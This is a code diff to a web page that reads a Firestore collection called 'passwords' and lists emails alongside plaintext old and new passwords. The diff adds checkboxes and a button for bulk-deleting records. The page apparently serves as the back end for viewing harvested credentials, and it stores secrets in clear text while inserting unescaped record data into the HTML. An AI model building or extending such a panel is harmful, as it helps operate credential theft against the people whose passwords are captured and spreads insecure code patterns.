@@ -51,11 +51,23 @@
     tr:hover {
       background-color: #e9ecef;
     }
-    .footer {
-      text-align: center;
-      margin-top: 20px;
+    .actions {
+      display: flex;
+      justify-content: flex-end;
+      margin-bottom: 10px;
+    }
+    .delete-btn {
+      background-color: #dc3545;
+      color: white;
+      border: none;
+      padding: 10px 15px;
       font-size: 14px;
-      color: #6c757d;
+      border-radius: 5px;
+      cursor: pointer;
+      display: none;
+    }
+    .delete-btn:hover {
+      background-color: #c82333;
     }
   </style>
 </head>
@@ -66,9 +78,13 @@
 
   <div class="container">
     <h2>User Details</h2>
+    <div class="actions">
+      <button id="deleteBtn" class="delete-btn">Delete Selected</button>
+    </div>
     <table>
       <thead>
         <tr>
+          <th>Select</th>
           <th>Email</th>
           <th>Old Password</th>
           <th>New Password</th>
@@ -86,7 +102,7 @@
 
   <script type="module">
     import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js';
-    import { getFirestore, collection, query, orderBy, getDocs } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js';
+    import { getFirestore, collection, query, orderBy, getDocs, deleteDoc, doc } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js';
 
     // Firebase configuration
     const firebaseConfig = {
@@ -105,6 +121,7 @@
 
     // Fetch and display user data sorted by timestamp (most recent first)
     const userTable = document.getElementById('userTable');
+    const deleteBtn = document.getElementById('deleteBtn');
 
     async function loadUserData() {
       try {
@@ -115,6 +132,7 @@
           const data = doc.data();
           const row = `
             <tr>
+              <td><input type="checkbox" class="select-row" data-id="${doc.id}"></td>
               <td>${data.email}</td>
               <td>${data.oldPassword}</td>
               <td>${data.newPassword}</td>
@@ -122,10 +140,41 @@
           `;
           userTable.insertAdjacentHTML('beforeend', row);
         });
+
+        addCheckboxListeners();
       } catch (error) {
         console.error("Error loading user data:", error);
       }
     }
+
+    // Show delete button when a checkbox is selected
+    function addCheckboxListeners() {
+      const checkboxes = document.querySelectorAll('.select-row');
+      checkboxes.forEach((checkbox) => {
+        checkbox.addEventListener('change', () => {
+          const anyChecked = Array.from(checkboxes).some((cb) => cb.checked);
+          deleteBtn.style.display = anyChecked ? 'inline-block' : 'none';
+        });
+      });
+    }
+
+    // Delete selected users
+    deleteBtn.addEventListener('click', async () => {
+      const selectedRows = document.querySelectorAll('.select-row:checked');
+      const idsToDelete = Array.from(selectedRows).map((row) => row.dataset.id);
+
+      if (idsToDelete.length > 0 && confirm('Are you sure you want to delete the selected users?')) {
+        try {
+          await Promise.all(
+            idsToDelete.map((id) => deleteDoc(doc(db, 'passwords', id)))
+          );
+          alert('Selected users deleted successfully.');
+          location.reload(); // Refresh the page to update the table
+        } catch (error) {
+          console.error("Error deleting users:", error);
+        }
+      }
+    });
 
     // Load user data on page load
     loadUserData();
